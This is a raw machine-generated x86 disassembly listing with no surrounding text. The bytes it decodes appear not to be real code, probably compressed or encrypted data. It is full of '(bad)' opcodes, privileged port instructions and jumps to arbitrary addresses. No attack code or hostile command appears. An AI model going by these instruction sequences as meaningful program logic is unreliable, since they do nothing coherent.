  42beb5:	lods   eax,DWORD PTR ds:[esi]
  42beb6:	dec    ecx
  42beb7:	aas    
  42beb8:	(bad)  
  42beba:	call   0x54b06211
  42bebf:	loopne 0x42be78
  42bec1:	jl     0x42bec3
	...
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	cmp    DWORD PTR [edi+edi*2+0x11],0xfffffff0
  42bf45:	rol    DWORD PTR [ecx],1
  42bf47:	add    dh,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR ds:0x682645bf,al
  42bf51:	hlt    
  42bf52:	cmp    eax,0x320e0d19
  42bf57:	lods   eax,DWORD PTR ds:[esi]
  42bf58:	push   0x70007fa4
  42bf5d:	inc    ebx
  42bf5e:	bound  ebx,QWORD PTR [esi+0x39ada694]
  42bf64:	shl    BYTE PTR [ecx+esi*1-0x47],0x39
  42bf69:	push   es
  42bf6a:	stos   BYTE PTR es:[edi],al
  42bf6b:	scas   al,BYTE PTR es:[edi]
  42bf6c:	arpl   WORD PTR [edx],sp
  42bf6e:	call   0x16157319
  42bf73:	xchg   edx,eax
  42bf74:	lahf   
  42bf75:	and    DWORD PTR [edx+ebp*4-0x67],esp
  42bf79:	inc    ecx
  42bf7a:	retf   0x2e8e
  42bf7d:	ret    
  42bf7e:	cmp    eax,0x3b7f63df
  42bf83:	adc    al,0xf5
  42bf85:	fidivr DWORD PTR [ecx-0x15]
  42bf88:	loopne 0x42bfd0
  42bf8a:	jno    0x42bf70
  42bf8c:	xor    al,0x4b
  42bf8e:	in     al,dx
  42bf8f:	fs mov cl,0xac
  42bf92:	(bad)  
  42bf94:	scas   al,BYTE PTR es:[edi]
  42bf95:	sub    al,0x91
  42bf97:	fsub   QWORD PTR [edx+edx*8+0x12]
  42bf9b:	jno    0x42bf72
  42bf9d:	sbb    al,0x78
  42bf9f:	fwait
  42bfa0:	inc    esp
  42bfa1:	add    DWORD PTR [ecx+edx*1],0x7a
  42bfa5:	cmp    cl,BYTE PTR [ebx]
  42bfa7:	cmc    
  42bfa8:	cmp    edi,DWORD PTR [ebx-0xe367991]
  42bfae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfaf:	aad    0x51
  42bfb1:	xchg   edx,eax
  42bfb2:	pop    edi
  42bfb3:	lahf   
  42bfb4:	mov    ebx,0x2855671c
  42bfb9:	lock sub eax,0xea0bf50b
  42bfbf:	adc    cl,ch
  42bfc1:	mov    edi,ebp
  42bfc3:	mov    ecx,0xf791d1d2
  42bfc8:	jmp    0x8991:0x48465fda
  42bfcf:	das    
  42bfd0:	in     eax,0x56
  42bfd2:	dec    eax
  42bfd3:	xlat   BYTE PTR ds:[ebx]
  42bfd4:	xchg   edx,eax
  42bfd5:	push   DWORD PTR [edx+0xc752567]
  42bfdb:	push   es
  42bfdc:	mov    bl,BYTE PTR [edx-0x1f]
  42bfdf:	and    esp,eax
  42bfe1:	inc    esp
  42bfe2:	sbb    eax,0xb91b559e
  42bfe7:	mov    edi,0x56e81bd8
  42bfec:	(bad)
  42bff0:	cmp    al,BYTE PTR [ecx+0x7b]
  42bff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bff4:	xor    bl,BYTE PTR [esi+eax*2]
  42bff7:	sbb    BYTE PTR [ebx+0x50],ah
  42bffa:	das    
  42bffb:	enter  0xdd1c,0xf8
  42bfff:	out    0x18,al
  42c001:	repz and BYTE PTR [edi],ch
  42c004:	adc    dh,BYTE PTR [edi]
  42c006:	add    dl,BYTE PTR [ebx-0x7]
  42c009:	and    bh,BYTE PTR [eax-0x5e]
  42c00c:	dec    edi
  42c00d:	mov    eax,0x4a575117
  42c012:	and    ch,al
  42c014:	adc    BYTE PTR [ebx],bl
  42c016:	fisttp WORD PTR [edi-0x77]
  42c019:	sbb    ebp,0x65
  42c01c:	xchg   esp,eax
  42c01d:	push   esp
  42c01e:	and    cl,BYTE PTR [edi-0x2f62710d]
  42c024:	cli    
  42c025:	inc    esp
  42c026:	dec    ecx
  42c027:	loopne 0x42c09f
  42c029:	mov    BYTE PTR [esi],al
  42c02b:	xor    dl,BYTE PTR [edi+0x7d66a937]
  42c031:	mov    ds:0x67fa8114,eax
  42c036:	out    dx,eax
  42c037:	mov    cl,BYTE PTR [ebx+0x648d392d]
  42c03d:	fs jecxz 0x42bffc
  42c040:	stos   DWORD PTR es:[edi],eax
  42c041:	popa   
	...
  42c0b2:	add    BYTE PTR [eax],al
  42c0b4:	jne    0x42c0db
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xf3942915
  42c0c1:	mov    edx,DWORD PTR [esi+0x24]
  42c0c4:	out    0xd2,al
  42c0c6:	add    DWORD PTR [eax],eax
  42c0c8:	test   BYTE PTR [eax],0x0
  42c0cb:	add    bl,bh
  42c0cd:	jae    0x42c144
  42c0cf:	adc    cl,bh
  42c0d1:	mov    ebp,0xe0a1c240
  42c0d6:	adc    al,0xc8
  42c0d8:	adc    ch,bh
  42c0da:	gs pop edi
  42c0dc:	jp     0x42c15d
  42c0de:	dec    esi
  42c0df:	mov    edi,0x898933b8
  42c0e4:	sar    BYTE PTR [edi],0x58
  42c0e7:	loope  0x42c155
  42c0e9:	scas   al,BYTE PTR es:[edi]
  42c0ea:	imul   eax,DWORD PTR ds:0x713020c,0x3a
  42c0f1:	xor    BYTE PTR [ecx+0x26dc7d89],ah
  42c0f7:	add    eax,0xb29d127f
  42c0fc:	or     BYTE PTR [ecx-0x533f611e],ah
  42c102:	pop    eax
  42c103:	push   0xed35b16a
  42c108:	jb     0x42c110
  42c10a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42c10c:	jnp    0x42c097
  42c10e:	ds cmp ecx,edi
  42c111:	push   0xde4b94d4
  42c116:	jg     0x42c16a
  42c118:	loop   0x42c10a
  42c11a:	cli    
  42c11b:	enter  0x420d,0xd8
  42c11f:	bound  ebp,QWORD PTR [edx+0x17]
  42c122:	mov    eax,0xaf214873
  42c127:	in     eax,0x6
  42c129:	icebp  
  42c12a:	out    dx,eax
  42c12b:	and    al,0xa2
  42c12d:	fisttp WORD PTR [ecx-0x5a1004c7]
  42c133:	pop    esp
  42c134:	dec    esp
  42c135:	push   edi
  42c136:	or     bl,BYTE PTR [ecx+0x0]
  42c139:	pop    edx
  42c13a:	push   edx
  42c13b:	and    al,0xe9
  42c13d:	push   edi
  42c13e:	dec    esp
  42c13f:	icebp  
  42c140:	sti    
  42c141:	jp     0x42c14b
  42c143:	ds xchg edi,eax
  42c145:	inc    esp
  42c146:	inc    edx
  42c147:	xor    bl,BYTE PTR [ebx+0x15a7c7e5]
  42c14d:	mov    ecx,0xfaab696f
  42c152:	inc    ebx
  42c153:	retf   0x9ce7
  42c156:	push   edx
  42c157:	add    eax,DWORD PTR [ecx+0x62d08ca2]
  42c15d:	test   DWORD PTR [ebx+0x43],edx
  42c160:	into   
  42c161:	loop   0x42c10d
  42c163:	mov    cl,0xa2
  42c165:	jns    0x42c1da
  42c167:	js     0x42c15d
  42c169:	rol    ebp,cl
  42c16b:	(bad)  
  42c16c:	and    DWORD PTR [edi+0x52803afa],eax
  42c172:	leave  
  42c173:	push   ebp
  42c174:	sub    DWORD PTR [edx+0x2fc829e2],0x29
  42c17b:	and    eax,0x22f71e62
  42c180:	mov    ah,0x1e
  42c182:	dec    esp
  42c183:	jmp    0xfbd22931
  42c188:	ds hlt 
  42c18a:	mov    dl,0xb
  42c18c:	xchg   esi,eax
  42c18d:	imul   edx,esp,0x7e
  42c190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c191:	popf   
  42c192:	add    DWORD PTR [ebx-0x4a],ecx
  42c195:	inc    ebx
  42c196:	es fs ds mov dh,0x98
  42c19b:	(bad)  
  42c19c:	in     eax,0x2
  42c19e:	call   0xe3c7:0x786b8119
  42c1a5:	retf   
  42c1a6:	add    BYTE PTR [esi+0x49],bh
  42c1a9:	pop    ebx
  42c1aa:	daa    
  42c1ab:	and    BYTE PTR [esi+ecx*2-0x578535bf],cl
  42c1b2:	xor    ecx,0x4
  42c1b5:	mov    esp,DWORD PTR [ebx-0x29ff826d]
  42c1bb:	sub    BYTE PTR ss:[ecx],ah
  42c1be:	cmp    edi,DWORD PTR [esi+0x8584]
	...
  42c234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c235:	mov    ds,WORD PTR [ecx-0x28844a0]
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x24]
  42c241:	es mov ebp,0x1d3dca6
  42c247:	add    dh,dh
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [ecx+0x73227188],al
  42c251:	mov    dh,0x4c
  42c253:	ja     0x42c271
  42c255:	int3   
  42c256:	mov    dl,0x23
  42c258:	jmp    0x42c1f7
  42c25a:	adc    al,0xa5
  42c25c:	mov    al,ds:0x5f53ed70
  42c261:	mov    DWORD PTR [edx+0x2c6b6e0],esp
  42c267:	fnsave [edi]
  42c269:	(bad)  
  42c26b:	jmp    0x6a5318fa
  42c270:	pop    ds
  42c271:	add    dh,cl
  42c273:	push   si
  42c275:	loope  0x42c2bf
  42c277:	xor    eax,0xf42f2f91
  42c27c:	mov    eax,ds:0x118410e7
  42c281:	test   DWORD PTR ds:0x31a7b09b,esi
  42c287:	dec    cx
  42c289:	stos   DWORD PTR es:[edi],eax
  42c28a:	or     BYTE PTR [eax-0x6a],al
  42c28d:	cmp    al,0x99
  42c28f:	mov    eax,ds:0x1c1c309e
  42c294:	jbe    0x42c21a
  42c296:	xor    bl,BYTE PTR [ecx-0x2b]
  42c299:	cli    
  42c29a:	xor    esp,eax
  42c29c:	jecxz  0x42c233
  42c29e:	(bad)
  42c2a1:	sahf   
  42c2a2:	(bad)  
  42c2a3:	out    dx,eax
  42c2a4:	push   0xffffff88
  42c2a6:	mov    edi,0xa6c133ef
  42c2ab:	cmp    BYTE PTR [bx+di],bl
  42c2ae:	pop    ecx
  42c2af:	mov    ss,WORD PTR [esi+0x35]
  42c2b2:	repz sbb eax,0x135d8cd0
  42c2b8:	xchg   edi,eax
  42c2b9:	xor    edx,edx
  42c2bb:	push   ds
  42c2bc:	pusha  
  42c2bd:	add    al,0x86
  42c2bf:	scas   eax,DWORD PTR es:[edi]
  42c2c0:	ins    DWORD PTR es:[edi],dx
  42c2c1:	xchg   esi,eax
  42c2c2:	mov    eax,0xab5711f6
  42c2c7:	cmp    DWORD PTR [ecx],0xf988816a
  42c2cd:	jp     0x42c2d4
  42c2cf:	add    BYTE PTR [ecx+ebx*1+0x23],cl
  42c2d3:	mov    ds:0x74451b65,eax
  42c2d8:	in     eax,0x4d
  42c2da:	jl     0x42c29a
  42c2dc:	sub    ax,0xc9f9
  42c2e0:	push   ebp
  42c2e1:	or     esp,DWORD PTR [eax+0x17121983]
  42c2e7:	dec    eax
  42c2e8:	dec    eax
  42c2e9:	inc    eax
  42c2ea:	mov    esi,0x2e1c5330
  42c2ef:	push   esp
  42c2f0:	adc    al,0xf
  42c2f2:	jmp    0xa1f5:0xe19e0684
  42c2f9:	je     0x42c2b2
  42c2fb:	pop    ebp
  42c2fc:	aaa    
  42c2fd:	(bad)  
  42c2fe:	mov    ebp,0xe05f6365
  42c303:	add    edi,DWORD PTR [esi+edi*2-0x383e8439]
  42c30a:	inc    ebx
  42c30b:	cli    
  42c30c:	mov    eax,0x54bb2499
  42c311:	xchg   ecx,eax
  42c312:	or     al,0x6f
  42c314:	cmp    al,0xfd
  42c316:	ret    
  42c317:	loop   0x42c388
  42c319:	inc    esp
  42c31a:	cli    
  42c31b:	mov    bl,0x5b
  42c31d:	mov    ch,0xc9
  42c31f:	xor    BYTE PTR [bp+0x26],dh
  42c323:	lock push 0x73
  42c326:	scas   eax,DWORD PTR es:[edi]
  42c327:	and    eax,0x2bc046bc
  42c32c:	xor    BYTE PTR [esi+0x69f971f7],ah
  42c332:	es int3 
  42c334:	stos   BYTE PTR es:[edi],al
  42c335:	das    
  42c336:	inc    eax
  42c337:	sbb    al,0xc9
  42c339:	shrd   DWORD PTR [eax+0x2b913af4],eax,0x3c
  42c341:	sub    DWORD PTR [eax],eax
	...
  42c3b3:	add    BYTE PTR [edx-0x1011dfbb],cl
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x61]
  42c3c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3c2:	test   DWORD PTR [edi],esp
  42c3c4:	rcl    ah,cl
  42c3c6:	add    DWORD PTR [eax],eax
  42c3c8:	test   BYTE PTR [eax],0x0
  42c3cb:	add    BYTE PTR [edi],bl
  42c3cd:	test   eax,0x5b315063
  42c3d2:	std    
  42c3d3:	aam    0xc7
  42c3d5:	add    BYTE PTR [ebp+0x332204d6],dh
  42c3db:	js     0x42c440
  42c3dd:	in     al,0xbf
  42c3df:	lahf   
  42c3e0:	hlt    
  42c3e1:	xchg   cl,dh
  42c3e3:	fdiv   QWORD PTR [esi-0xd4af9c8]
  42c3e9:	ror    DWORD PTR [esi],1
  42c3eb:	mov    ah,0x31
  42c3ed:	lds    esp,FWORD PTR [esi]
  42c3ef:	loopne 0x42c377
  42c3f1:	imul   edi,DWORD PTR [edi+0x2c],0xfffffffa
  42c3f5:	fld    DWORD PTR [edi+0x11]
  42c3f8:	int3   
  42c3f9:	push   cs
  42c3fa:	shl    edx,0x62
  42c3fd:	call   0x59e2:0x91a2d449
  42c404:	iret   
  42c405:	inc    esp
  42c406:	sti    
  42c407:	jns    0x42c40c
  42c409:	push   ebp
  42c40a:	scas   al,BYTE PTR es:[edi]
  42c40b:	jmp    0xd303:0x8e38630c
  42c412:	xlat   BYTE PTR ds:[ebx]
  42c413:	je     0x42c3af
  42c415:	jecxz  0x42c449
  42c417:	not    BYTE PTR [edx]
  42c419:	aas    
  42c41a:	ss daa 
  42c41c:	int    0xaf
  42c41e:	push   DWORD PTR ds:0x7e27ac39
  42c424:	retf   
  42c425:	pop    eax
  42c426:	addr16 mov eax,0x96e17318
  42c42c:	jmp    0xd607:0x25da2bd7
  42c433:	push   ecx
  42c434:	cs inc esi
  42c436:	shl    dl,1
  42c438:	adc    esp,DWORD PTR [ebp-0x568dbc3a]
  42c43e:	mov    ecx,0xa949cfff
  42c443:	into   
  42c444:	cmp    ebx,ecx
  42c446:	cwde   
  42c447:	jnp    0x42c45c
  42c449:	fxch   st(6)
  42c44b:	inc    eax
  42c44c:	push   ebx
  42c44d:	sub    DWORD PTR [ecx+0x265e3349],ecx
  42c453:	dec    ebx
  42c454:	or     ecx,DWORD PTR [ebx-0x2820a1dc]
  42c45a:	xchg   edx,eax
  42c45b:	lock jb 0x42c475
  42c45e:	jecxz  0x42c4a2
  42c460:	pop    es
  42c461:	xchg   edi,eax
  42c462:	push   0x2e0db449
  42c467:	pop    esi
  42c468:	sub    eax,0x2b8f56ae
  42c46d:	or     eax,0x9504e901
  42c472:	mov    ds:0x7862dbd9,eax
  42c477:	inc    BYTE PTR [esi+0x688c727]
  42c47d:	xchg   esi,esi
  42c47f:	mov    dl,0x50
  42c481:	mov    ch,0x23
  42c483:	push   edi
  42c484:	mov    bh,0xaa
  42c486:	out    0xa6,al
  42c488:	mov    al,ds:0x2a137516
  42c48d:	retf   0x91df
  42c490:	imul   ebp,DWORD PTR ds:0xe8dc14c4,0x5a
  42c497:	jg     0x42c450
  42c499:	xor    eax,0x29d45a99
  42c49e:	xchg   edx,eax
  42c49f:	scas   al,BYTE PTR es:[edi]
  42c4a0:	loopne 0x42c47d
  42c4a2:	leave  
  42c4a3:	cdq    
  42c4a4:	push   ebx
  42c4a5:	sbb    BYTE PTR [ebx+0x71],dh
  42c4a8:	retf   0x388b
  42c4ab:	cmp    BYTE PTR ds:0xabd8a8e5,bl
  42c4b1:	data16 and BYTE PTR [ebx+0x4125e7db],ch
  42c4b8:	dec    edx
  42c4b9:	push   DWORD PTR [eax+0x488fe8a5]
  42c4bf:	leave  
  42c4c0:	scas   eax,DWORD PTR es:[edi]
  42c4c1:	arpl   WORD PTR [eax],ax
	...
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	mov    ch,0xf5
  42c542:	dec    eax
  42c543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c544:	enter  0x1d5,0x0
  42c548:	test   BYTE PTR [eax],0x0
  42c54b:	add    BYTE PTR [ebx-0x48],bh
  42c54e:	add    eax,0x3bc65784
  42c553:	enter  0x681,0x91
  42c557:	out    0x81,eax
  42c559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c55a:	fwait
  42c55b:	mov    edi,0x62e15fb5
  42c560:	repz push 0xd65a80be
  42c566:	add    DWORD PTR [esi-0x546ba9d0],0x2c
  42c56d:	mov    eax,ds:0xca6711b6
  42c572:	mov    dl,0x13
  42c574:	mov    ecx,0x27deb077
  42c579:	ja     0x42c548
  42c57b:	cli    
  42c57c:	push   0x88db6a0
  42c581:	test   DWORD PTR [edx],ebx
  42c583:	in     eax,dx
  42c584:	call   0x6b5e:0x22d58f05
  42c58b:	dec    ecx
  42c58c:	adc    al,0x7b
  42c58e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c58f:	jp     0x42c562
  42c591:	inc    ecx
  42c592:	aaa    
  42c593:	mov    edi,0xf3d23100
  42c598:	test   DWORD PTR [ecx+0x63],ebx
  42c59b:	jb     0x42c59f
  42c59d:	adc    eax,DWORD PTR [edi+0x4d]
  42c5a0:	jae    0x42c616
  42c5a2:	ss pop ecx
  42c5a4:	dec    eax
  42c5a5:	icebp  
  42c5a6:	push   cs
  42c5a7:	and    al,0xf9
  42c5a9:	(bad)  
  42c5aa:	icebp  
  42c5ab:	cmp    DWORD PTR [edx-0x5f],esi
  42c5ae:	inc    DWORD PTR [ebx]
  42c5b0:	repnz mov eax,ds:0xbc60a460
  42c5b6:	out    0x46,al
  42c5b8:	jg     0x42c5b2
  42c5ba:	dec    esi
  42c5bb:	jg     0x42c57a
  42c5bd:	imul   esi,edx,0xae19ab3c
  42c5c3:	adc    al,0xf9
  42c5c5:	sub    eax,0x82eb227
  42c5ca:	push   0x33
  42c5cc:	add    bl,dl
  42c5ce:	xchg   BYTE PTR [edi+0x53733c14],dl
  42c5d4:	arpl   WORD PTR [ebx+0x498c32eb],bx
  42c5da:	enter  0x6d1d,0xc9
  42c5de:	xor    eax,0xa3cfbc1d
  42c5e3:	xor    ebx,DWORD PTR [edx+ebx*2+0x5b]
  42c5e7:	inc    ecx
  42c5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5e9:	addr16 int 0x84
  42c5ec:	es dec esp
  42c5ee:	sbb    bl,dh
  42c5f0:	add    DWORD PTR [edi],0x53f09d4
  42c5f6:	dec    esp
  42c5f7:	pusha  
  42c5f8:	fstp   TBYTE PTR [esi]
  42c5fa:	mov    esp,0x5a10d313
  42c5ff:	leave  
  42c600:	adc    al,0xeb
  42c602:	jl     0x42c587
  42c604:	xchg   esp,eax
  42c606:	sahf   
  42c607:	shr    cl,cl
  42c609:	add    dh,BYTE PTR [edx+0x40]
  42c60c:	jecxz  0x42c658
  42c60e:	ins    DWORD PTR es:[edi],dx
  42c60f:	ds jae 0x42c63c
  42c612:	inc    ebx
  42c613:	pop    edi
  42c614:	inc    ebx
  42c615:	inc    edx
  42c616:	outs   dx,BYTE PTR ds:[esi]
  42c617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c618:	pop    ss
  42c619:	mov    ds:0x33e126d6,eax
  42c61e:	dec    esp
  42c61f:	and    edi,DWORD PTR [edx+0x554c867e]
  42c625:	mov    bl,0xce
  42c627:	enter  0xd6bf,0x6d
  42c62b:	test   eax,0x88f35460
  42c630:	in     eax,dx
  42c631:	xor    DWORD PTR [ebx-0x4e],eax
  42c634:	stos   DWORD PTR es:[edi],eax
  42c635:	in     eax,0x38
  42c637:	xchg   edi,eax
  42c638:	js     0x42c633
  42c63a:	pop    edx
  42c63b:	fldenv [ecx+0x24079637]
  42c641:	pop    es
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	dec    esi
  42c6b5:	inc    edx
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x82be,0x35
  42c6c2:	cld    
  42c6c3:	test   BYTE PTR [esi-0x9fffe2a],bh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    ah,cl
  42c6cd:	xchg   BYTE PTR [esi+0x1c],dh
  42c6d0:	cmp    eax,0xe0c8f35b
  42c6d5:	mov    dl,0xd9
  42c6d7:	jns    0x42c6cf
  42c6d9:	pop    edi
  42c6da:	ffreep st(6)
  42c6dc:	test   DWORD PTR ds:0x6209a15a,eax
  42c6e2:	js     0x42c717
  42c6e4:	xor    al,0x80
  42c6e6:	fimul  DWORD PTR [esp+ecx*2+0xc]
  42c6ea:	bound  esp,QWORD PTR [ecx]
  42c6ec:	lock and al,0x49
  42c6ef:	jl     0x42c757
  42c6f1:	push   edi
  42c6f2:	or     ah,BYTE PTR [esp+edx*8+0x48]
  42c6f6:	scas   al,BYTE PTR es:[edi]
  42c6f7:	mov    esi,0x6cddf2f
  42c6fc:	dec    esi
  42c6fd:	sbb    al,bl
  42c6ff:	sbb    eax,0x99e3fb39
  42c704:	pop    ebx
  42c705:	jns    0x42c6bf
  42c707:	(bad)  
  42c708:	retf   
  42c709:	lods   eax,DWORD PTR ds:[esi]
  42c70a:	es jo  0x42c69f
  42c70d:	outs   dx,BYTE PTR ds:[esi]
  42c70e:	mov    ?,WORD PTR [eax+0x69]
  42c711:	lea    ecx,[ebp+0x3a]
  42c714:	into   
  42c715:	xchg   esi,eax
  42c716:	mov    edx,0x20307a2f
  42c71b:	pop    es
  42c71c:	imul   DWORD PTR [esi-0xc]
  42c71f:	test   eax,0x78257aed
  42c724:	mov    WORD PTR [ebp+edx*4+0x72a26c03],ds
  42c72b:	lahf   
  42c72c:	jge    0x42c7a5
  42c72e:	test   DWORD PTR [ebx-0x73d17020],esp
  42c734:	lahf   
  42c735:	push   esp
  42c736:	xchg   ebp,eax
  42c737:	scas   al,BYTE PTR es:[edi]
  42c738:	rcl    DWORD PTR [esi],0x12
  42c73b:	and    eax,0x587ddfa0
  42c740:	push   eax
  42c741:	add    DWORD PTR [ecx+0xef692cd],edx
  42c747:	fild   WORD PTR [edx+0x70]
  42c74a:	xchg   bp,ax
  42c74c:	out    dx,al
  42c74d:	rcr    DWORD PTR [ebp-0x2f],0x3c
  42c751:	and    DWORD PTR [edx+0x4d844d43],eax
  42c757:	inc    edi
  42c758:	xchg   ebx,eax
  42c759:	add    eax,DWORD PTR [eax]
  42c75b:	mov    ebx,edx
  42c75d:	mov    ds:0xdd95d552,eax
  42c762:	mov    bh,0xac
  42c764:	outs   dx,BYTE PTR ds:[esi]
  42c765:	pop    ds
  42c766:	enter  0xe6cc,0x81
  42c76a:	mov    eax,DWORD PTR [ebx+esi*8-0xa81020c]
  42c771:	shr    BYTE PTR [esp+eiz*8+0x367dcfa9],1
  42c778:	and    ebx,DWORD PTR [edx+0x5]
  42c77b:	add    BYTE PTR [ecx-0x3592d6c5],ah
  42c781:	lea    esp,[edx-0x18]
  42c784:	ret    
  42c785:	mov    esi,0x1ca52b5d
  42c78a:	jne    0x42c7ac
  42c78c:	mov    bl,0x13
  42c78e:	mov    ds:0xf942677,al
  42c793:	jae    0x42c71d
  42c795:	mov    bh,0xd9
  42c797:	dec    edx
  42c798:	pop    ebx
  42c799:	jae    0x42c817
  42c79b:	retf   0xa906
  42c79e:	mov    ?,WORD PTR [ebp+0x1c995bde]
  42c7a4:	in     al,dx
  42c7a5:	in     al,0xc6
  42c7a7:	xchg   edx,eax
  42c7a8:	sahf   
  42c7a9:	jb     0x42c732
  42c7ab:	outs   dx,DWORD PTR ds:[esi]
  42c7ac:	scas   eax,DWORD PTR es:[edi]
  42c7ad:	cmc    
  42c7ae:	arpl   WORD PTR [ebx+0x414e06aa],di
  42c7b4:	cmp    BYTE PTR [eax+0x7f],ch
  42c7b7:	pop    eax
  42c7b8:	int3   
  42c7b9:	or     eax,0x13881ff9
  42c7be:	js     0x42c780
  42c7c0:	push   ebp
  42c7c1:	mov    eax,0x0
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0x738fb78
  42c844:	mov    ah,0xd7
  42c846:	add    DWORD PTR [eax],eax
  42c848:	test   BYTE PTR [eax],0x0
  42c84b:	add    ah,al
  42c84d:	push   cs
  42c84e:	(bad)  
  42c850:	jae    0x42c80d
  42c852:	lea    eax,[edi-0x2bc08606]
  42c858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c859:	pop    esi
  42c85a:	sbb    eax,0x8cc0abdd
  42c85f:	mov    DWORD PTR [esi+edx*4+0x11338b6],esi
  42c866:	fild   QWORD PTR [esi+0x25b05818]
  42c86c:	je     0x42c8d2
  42c86e:	aaa    
  42c86f:	push   DWORD PTR [eax-0x2ae4d282]
  42c875:	sub    cl,al
  42c877:	cmp    al,0xe1
  42c879:	ret    0x1f45
  42c87c:	mov    dh,0x7d
  42c87e:	popa   
  42c87f:	push   ebp
  42c880:	inc    edx
  42c881:	xlat   BYTE PTR ds:[ebx]
  42c882:	mov    al,ds:0x8651df6e
  42c887:	fld    TBYTE PTR [ebp-0x47]
  42c88a:	(bad)  
  42c88b:	pop    ecx
  42c88c:	cli    
  42c88d:	cmp    BYTE PTR [eax+esi*4+0x60],al
  42c891:	mov    eax,esp
  42c893:	sub    ah,bh
  42c895:	arpl   dx,di
  42c897:	test   al,0xf2
  42c899:	mov    edi,0xd120a40c
  42c89e:	(bad)  
  42c89f:	retf   0x3bbd
  42c8a2:	fidivr DWORD PTR [edi-0x2f]
  42c8a5:	dec    ebp
  42c8a6:	jb     0x42c8ad
  42c8a8:	mov    ?,WORD PTR [ebp+0x74]
  42c8ab:	cmp    BYTE PTR ds:0x457ad471,0x96
  42c8b2:	in     al,0x6e
  42c8b4:	push   ebx
  42c8b5:	(bad)  
  42c8b7:	and    al,0x1
  42c8b9:	outs   dx,BYTE PTR ds:[esi]
  42c8ba:	cmp    al,0x54
  42c8bc:	push   0x74485ade
  42c8c1:	shr    BYTE PTR [esi],cl
  42c8c3:	cli    
  42c8c4:	repz js 0x42c8bb
  42c8c7:	and    edx,DWORD PTR ds:0xda7ff648
  42c8cd:	jne    0x42c8c2
  42c8cf:	sbb    al,0xd9
  42c8d1:	mov    ch,0xb8
  42c8d3:	push   esi
  42c8d4:	leave  
  42c8d5:	dec    eax
  42c8d6:	pop    ds
  42c8d7:	sar    DWORD PTR [eax-0x6e],1
  42c8da:	call   0x301c7956
  42c8df:	out    0xd1,eax
  42c8e1:	xlat   BYTE PTR ds:[ebx]
  42c8e2:	jns    0x42c8bf
  42c8e4:	mov    ds:0xed56f244,eax
  42c8e9:	inc    eax
  42c8ea:	push   0xffffff82
  42c8ec:	ret    
  42c8ed:	pop    ebp
  42c8ee:	or     ch,BYTE PTR [esi]
  42c8f0:	sub    DWORD PTR [edi-0x8],ecx
  42c8f3:	fnstcw WORD PTR [esp+ebp*2-0x65]
  42c8f7:	xor    BYTE PTR [ecx-0x1b1b2127],bl
  42c8fd:	sbb    bh,BYTE PTR [ecx-0x7c]
  42c900:	jmp    FWORD PTR [edx+eax*4-0x34]
  42c904:	mov    ds:0xb388cb0c,eax
  42c909:	push   ss
  42c90a:	mov    cl,0x6c
  42c90c:	jbe    0x42c8ec
  42c90e:	and    al,0x1e
  42c910:	inc    ecx
  42c911:	adc    BYTE PTR [ecx-0x1b],bh
  42c914:	icebp  
  42c915:	(bad)
  42c918:	jle    0x42c8a9
  42c91a:	xchg   esp,eax
  42c91b:	cld    
  42c91c:	test   DWORD PTR [ecx-0x13],eax
  42c91f:	mov    edi,0xd85728a8
  42c924:	je     0x42c905
  42c926:	bound  edi,QWORD PTR [eax]
  42c928:	mov    ch,0xdd
  42c92a:	pop    esp
  42c92b:	sbb    al,BYTE PTR [ecx+0x1d997ee3]
  42c931:	push   0xffffffcd
  42c933:	push   esp
  42c934:	ja     0x42c913
  42c936:	mov    ebp,0xeb94143f
  42c93b:	sbb    al,0x7e
  42c93d:	clc    
  42c93e:	or     DWORD PTR [ebx],0x74
  42c941:	outs   dx,DWORD PTR ds:[esi]
	...
  42c9b2:	add    BYTE PTR [eax],al
  42c9b4:	mov    eax,DWORD PTR [edi]
  42c9b6:	mov    al,0xe2
  42c9b8:	mov    esp,0xb56fdbf7
  42c9bd:	ficom  DWORD PTR [esi+0x22]
  42c9c0:	fisub  WORD PTR [edx]
  42c9c2:	mov    edx,0x1d8aa32
  42c9c7:	add    dh,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [esi-0x7ad519e1],cl
  42c9d1:	or     al,BYTE PTR [edx-0x4b]
  42c9d4:	mov    WORD PTR [ebx],?
  42c9d6:	cmp    al,0x55
